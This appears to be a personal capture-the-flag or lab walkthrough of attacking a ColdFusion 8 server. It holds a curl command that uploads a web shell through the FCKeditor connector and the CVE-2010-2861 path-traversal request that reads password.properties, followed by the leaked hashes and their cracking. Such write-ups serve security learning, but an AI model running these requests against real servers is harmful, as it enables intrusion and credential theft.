10.129.132.220:8500 in the browser reveals a directory. After navigating a bit I discovered the usage of CF Adobe coldfusion 8.
Some research tells me that /CFIDE/Administrator is a common path, and when tested the login page was revealed. 
  Admin credential is already auto-populated. Going to try default credentials.


Found a metasploit module to scan coldfusion:
msf6 auxiliary(scanner/http/coldfusion_locale_traversal) > run

and a few others but they just redirected me to the login page html.

This metasploit module didn't work either. Trying to enumerate further.
After continously trying to automate file uploads using metasploit, they weren't working. I tried a manual file upload:
┌──(cesar㉿kali)-[~]
└─$ curl -F "NewFile=@shell.cfm" "http://10.129.132.220:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm"

the upload succeeded. Could not locate the uploaded file. Moved onto another vulnerability.

After reading the github repository on CVE-2010-2861, I ran this command with the help of chatgpt:
curl -s "http://10.129.132.220:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en"
and I was able to find passwords.

rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true

First step was to break down the hash. It's an RDS hash. ran:
echo "2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03" | hashid
returned SHA-1. Time to crack
Dictionary cache hit:

Login to admin panel with this password was a success.
